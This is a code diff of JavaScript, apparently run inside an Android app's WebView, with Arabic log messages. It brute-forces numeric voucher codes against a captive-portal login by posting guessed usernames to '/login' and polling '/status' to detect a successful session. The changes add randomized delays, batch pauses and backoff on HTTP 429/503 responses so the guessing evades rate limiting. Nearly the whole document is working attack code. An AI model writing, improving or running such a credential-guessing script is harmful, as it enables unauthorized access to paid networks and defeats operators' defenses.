@@ -5,36 +5,39 @@
     let stopped = false;
     window.stopFinder = function() { stopped = true; };
 
-    
-function updatePageInput(v) {
-    try {
-        var inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[name="username"]');
-        for (var i = 0; i < inputs.length; i++) {
-            var inp = inputs[i];
-            if (inp.id !== 'urlBar' && inp.name !== 'urlBar') {
-                inp.value = v;
-                inp.dispatchEvent(new Event('input', {bubbles:true}));
-                inp.dispatchEvent(new Event('change', {bubbles:true}));
-                break;
-            }
-        }
-    } catch(e) {}
-}
-
     function log(m) { try { window.AndroidBridge.log(m); } catch(e) {} }
     const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-    async function safeJson(url) {
+    function updatePageInput(v) {
         try {
-            const r = await fetch(url, { credentials: 'include', cache: 'no-cache' });
+            var inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[name="username"], input[id*="username"]');
+            for (var i = 0; i < inputs.length; i++) {
+                var inp = inputs[i];
+                if (inp.id !== 'urlBar' && inp.name !== 'urlBar') {
+                    inp.value = v;
+                    inp.dispatchEvent(new Event('input', {bubbles:true}));
+                    inp.dispatchEvent(new Event('change', {bubbles:true}));
+                    break;
+                }
+            }
+        } catch(e) {}
+    }
+
+    async function safeJson(url) {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
+        try {
+            const r = await fetch(url, { credentials: 'include', cache: 'no-cache', signal: controller.signal });
+            clearTimeout(timeoutId);
             const t = await r.text();
             try { return JSON.parse(t); } catch(e) {
                 const s = t.indexOf('{'), e2 = t.lastIndexOf('}');
                 if (s !== -1 && e2 > s) { try { return JSON.parse(t.substring(s, e2+1)); } catch(_) {} }
                 return null;
             }
-        } catch(e) { log("⚠ fetch status فشل: " + e.message); return null; }
+        } catch(e) { clearTimeout(timeoutId); return null; }
     }
+
     function isActive(st) {
         if (!st) return false;
         const li = String(st.logged_in || '').toLowerCase();
@@ -55,15 +58,6 @@ function updatePageInput(v) {
         if (!m) return -1;
         return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
     }
-    function calcParallel(r) {
-        if (r < 50) return 10;
-        if (r < 100) return 8;
-        if (r < 180) return 6;
-        if (r < 300) return 4;
-        if (r < 500) return 3;
-        if (r < 900) return 2;
-        return 1;
-    }
 
     async function run() {
         try {
@@ -71,7 +65,7 @@ function updatePageInput(v) {
             const statusUrl = base + '/status?var=callBack';
             const loginUrl = base + '/login';
 
-            log('▶ بدء التخمين');
+            log('▶ بدء التخمين (نمط بايثون الآمن)');
             
             const init = await safeJson(statusUrl);
             if (init && isActive(init)) {
@@ -84,9 +78,6 @@ function updatePageInput(v) {
                 log('⚠ جلسة نشطة، username مخفي');
                 return;
             }
-
-            let parallel = CFG.rttEvery > 0 ? CFG.rttEvery : 5;
-            log('  السرعة (التوازي) = ' + parallel);
 
             let template = { username: '', password: '', dst: base + '/', popup: 'true' };
             try {
@@ -101,13 +92,24 @@ function updatePageInput(v) {
                 }
             } catch(e) { }
 
-            log('▶ بدء المحاولات (' + CFG.attempts + ')');
-
             const maxVal = Math.pow(10, CFG.digits) - 1;
             const tried = new Set();
             const beforeUp = init ? uptimeSec(init.uptime) : -1;
             const beforeActive = isActive(init);
-            let done = 0, batchCount = 0;
+            
+            let done = 0;
+            let batchCount = 0;
+            
+            const MAX_CONCURRENT = CFG.threads || 3;
+            const DELAY_MIN = CFG.pause || 300;
+            const DELAY_MAX = DELAY_MIN * 4;
+            const BATCH_SIZE = CFG.statusEvery || 50;
+            const BATCH_REST = 5000;
+            const RETRY_DELAY = CFG.retryDelay || 1000;
+
+            log('  التوازي = ' + MAX_CONCURRENT);
+            log('  التأخير = ' + DELAY_MIN + 'ms إلى ' + DELAY_MAX + 'ms');
+            log('  حجم الدفعة = ' + BATCH_SIZE + ' (ثم استراحة 5 ثواني)');
 
             function gen() {
                 for (let k = 0; k < 500; k++) {
@@ -119,46 +121,66 @@ function updatePageInput(v) {
             }
 
             async function post(v) {
+                const delay = Math.floor(Math.random() * (DELAY_MAX - DELAY_MIN + 1)) + DELAY_MIN;
+                await sleep(delay);
+
                 const body = new URLSearchParams();
                 for (const k in template) body.set(k, template[k]);
                 body.set('username', v);
                 body.set('password', '');
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+                
                 try {
                     const r = await fetch(loginUrl, {
                         method: 'POST', body: body.toString(),
                         credentials: 'include',
                         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        redirect: 'manual'
+                        redirect: 'manual',
+                        signal: controller.signal
                     });
+                    clearTimeout(timeoutId);
                     return { v, code: r.status };
                 } catch(e) {
+                    clearTimeout(timeoutId);
                     return { v, code: 0 };
                 }
             }
 
             while (done < CFG.attempts && !stopped) {
+                if (done > 0 && done % BATCH_SIZE === 0 && batchCount > 0) {
+                    log('💤 استراحة ' + (BATCH_REST/1000) + ' ثواني (BATCH_REST)...');
+                    await sleep(BATCH_REST);
+                    batchCount = 0;
+                }
+
                 const batch = [];
-                for (let j = 0; j < parallel && done < CFG.attempts; j++) {
+                for (let j = 0; j < MAX_CONCURRENT && done < CFG.attempts; j++) {
                     const v = gen();
                     if (!v) break;
                     done++;
                     
-                    // إظهار كل رقم يتم تجربته في السجل
+                    updatePageInput(v);
                     log('🔍 ' + v);
                     
                     try { window.AndroidBridge.progress(done, CFG.attempts, v); } catch(e){}
-                    updatePageInput(v);
-                    log("🔍 " + v);
                     batch.push(post(v));
                 }
                 if (batch.length === 0) break;
-
+                
+                batchCount += batch.length;
                 const results = await Promise.all(batch);
-                batchCount++;
+
+                const limited = results.some(r => r.code === 429 || r.code === 503);
+                if (limited) {
+                    log('🛑 حظر — انتظار ' + (RETRY_DELAY/1000) + ' ثانية...');
+                    await sleep(RETRY_DELAY);
+                }
 
                 const needCheck = results.some(r => r.code > 0 && r.code !== 429 && r.code !== 503);
                 if (needCheck) {
-                    await sleep(20);
+                    await sleep(200);
                     const st = await safeJson(statusUrl);
                     const u = statusUser(st);
                     if (u) {
@@ -176,10 +198,8 @@ function updatePageInput(v) {
                         }
                     }
                 }
-
-                if (CFG.pause > 0) await sleep(CFG.pause);
             }
-            log('❌ انتهى');
+            log('❌ انتهى — ' + done + ' محاولة');
         } catch(e) {
             log('❌ خطأ: ' + e.message);
         }
